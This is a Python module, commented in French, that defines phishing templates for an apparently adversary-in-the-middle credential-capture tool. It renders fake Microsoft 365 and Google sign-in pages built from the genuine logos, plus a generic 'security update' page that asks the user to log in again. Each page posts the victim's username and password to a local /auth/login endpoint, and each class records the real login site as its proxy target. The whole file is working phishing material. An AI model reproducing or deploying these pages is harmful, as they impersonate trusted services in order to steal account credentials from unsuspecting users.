from abc import ABC, abstractmethod
from typing import Dict, Optional

class PhishingTemplate(ABC):
    """
    Classe de base pour les templates de phishing.
    """
    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description
        
    @abstractmethod
    def render(self, context: Dict[str, str] = None) -> str:
        """Rend le contenu HTML du template."""
        pass
        
    @property
    @abstractmethod
    def target_url(self) -> str:
        """URL cible réelle (pour le proxy AiTM)."""
        pass

class MicrosoftLoginTemplate(PhishingTemplate):
    def __init__(self):
        super().__init__("Microsoft 365", "Faux login Microsoft 365 pour capture d'identifiants.")

    def render(self, context: Dict[str, str] = None) -> str:
        # Simplification: En prod, on chargerait un vrai fichier HTML
        return """
        <html>
            <head><title>Sign in to your account</title></head>
            <body style="font-family: 'Segoe UI', sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh;">
                <div style="background: white; padding: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 400px;">
                    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                    <h2>Sign in</h2>
                    <form action="/auth/login" method="POST">
                        <input type="email" name="login" placeholder="Email, phone, or Skype" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc;">
                        <input type="password" name="password" placeholder="Password" style="width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc;">
                        <button type="submit" style="width: 100%; padding: 10px; background-color: #0067b8; color: white; border: none; cursor: pointer;">Next</button>
                    </form>
                </div>
            </body>
        </html>
        """
        
    @property
    def target_url(self) -> str:
        return "https://login.microsoftonline.com"

class GoogleLoginTemplate(PhishingTemplate):
    def __init__(self):
        super().__init__("Google Workspace", "Faux login Google pour capture d'identifiants.")

    def render(self, context: Dict[str, str] = None) -> str:
        return """
        <html>
            <head><title>Sign in - Google Accounts</title></head>
            <body style="font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh;">
                <div style="border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 450px; text-align: center;">
                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="75" alt="Google">
                    <h2>Sign in</h2>
                    <p>to continue to Gmail</p>
                    <form action="/auth/login" method="POST">
                        <input type="email" name="email" placeholder="Email or phone" style="width: 100%; padding: 13px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px;">
                        <input type="password" name="password" placeholder="Enter your password" style="width: 100%; padding: 13px; margin-bottom: 30px; border: 1px solid #dadce0; border-radius: 4px;">
                        <button type="submit" style="background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: bold; cursor: pointer;">Next</button>
                    </form>
                </div>
            </body>
        </html>
        """

    @property
    def target_url(self) -> str:
        return "https://accounts.google.com"

class GenericUpdateTemplate(PhishingTemplate):
    def __init__(self):
        super().__init__("Generic Update", "Page de maintenance générique demandant une reconnexion.")

    def render(self, context: Dict[str, str] = None) -> str:
        company = context.get("company", "Your Company") if context else "Your Company"
        return f"""
        <html>
            <head><title>Security Update Required</title></head>
            <body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
                <h1>{company} Security Update</h1>
                <p>Your session has expired due to a mandatory security update.</p>
                <p>Please re-authenticate to continue.</p>
                <form action="/auth/login" method="POST">
                    <input type="text" name="username" placeholder="Username">
                    <input type="password" name="password" placeholder="Password">
                    <button type="submit">Login</button>
                </form>
            </body>
        </html>
        """

    @property
    def target_url(self) -> str:
        return "https://example.com" # Placeholder
